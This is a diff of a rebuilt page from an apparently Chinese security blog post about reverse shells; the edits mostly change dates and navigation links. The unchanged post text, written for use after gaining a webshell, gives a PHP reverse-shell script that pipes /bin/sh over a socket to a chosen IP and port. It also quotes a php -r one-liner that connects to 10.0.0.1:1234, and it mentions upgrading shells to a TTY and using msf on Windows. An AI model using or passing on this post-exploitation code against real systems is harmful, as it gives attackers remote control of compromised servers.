@@ -12,11 +12,11 @@
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="关于反弹shell的那些事">
-<meta property="og:url" content="https://geeeez.github.io/2018/06/01/关于反弹shell的那些事/index.html">
+<meta property="og:url" content="https://geeeez.github.io/2019/06/01/关于反弹shell的那些事/index.html">
 <meta property="og:site_name" content="geez博客">
 <meta property="og:description" content="反弹shell">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-29T15:33:19.892Z">
+<meta property="og:updated_time" content="2019-08-29T15:39:15.519Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="关于反弹shell的那些事">
 <meta name="twitter:description" content="反弹shell">
@@ -189,8 +189,8 @@
   
 
         
-        <a href="/2018/06/01/关于反弹shell的那些事/" class="archive-article-date">
-  	<time datetime="2018-06-01T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-01</time>
+        <a href="/2019/06/01/关于反弹shell的那些事/" class="archive-article-date">
+  	<time datetime="2019-06-01T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-01</time>
 </a>
         
       </header>
@@ -198,7 +198,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h4 id="众所周知的反弹shell"><a href="#众所周知的反弹shell" class="headerlink" title="众所周知的反弹shell"></a>众所周知的反弹shell</h4><hr>
-<p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a href="https://www.kkzevip.com/?post=21" target="_blank" rel="noopener">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个显示生活中非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。<br>代码如下，改好ip+port运行即可：</p>
+<p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a href="https://www.kkzevip.com/?post=21" target="_blank" rel="noopener">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个现实非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。</p>
+<a id="more"></a>
+<p>代码如下，改好ip+port运行即可：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>
 
 <p>真的是比网上的那些php反弹shell（比如：php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’）成功率高很多。当然此方法也有限制，限制就是系统没有禁用 proc_popen(默认不禁用)。</p>
@@ -233,7 +235,7 @@
 </li>
 </ul>
 <p>为什么是一个弱tty呢 因为ctrl+c 仍可以中断，不过已经够用了 vi su 等等命令已经不是问题了。<br>它可以利用socat和nc来实现强tty不过目前感觉没啥用！感兴趣的去看下这篇文章:  <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a><br>目前还没发现比这个更好用的交互式shell的利用。以后有了再补充这块吧！</p>
-<h4 id="windows-反弹shell"><a href="#windows-反弹shell" class="headerlink" title="windows 反弹shell"></a>windows 反弹shell</h4><hr>
+<h4 id="补充下windows-反弹shell"><a href="#补充下windows-反弹shell" class="headerlink" title="补充下windows 反弹shell"></a>补充下windows 反弹shell</h4><hr>
 <ul>
 <li><ol>
 <li>毫无疑问msf才是最适合windows反弹shell的工具</li>
@@ -357,7 +359,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2018/06/01/关于反弹shell的那些事/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2019/06/01/关于反弹shell的那些事/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -371,18 +373,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/03/01/adb的简单使用/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          adb工具的使用笔记
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/06/01/浅谈PHP的反序列化/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">浅谈 php反序列化</div>
+    <a href="/2019/03/01/adb的简单使用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">adb工具的使用笔记</div>
       <i class="icon-circle-right"></i>
     </a>
   
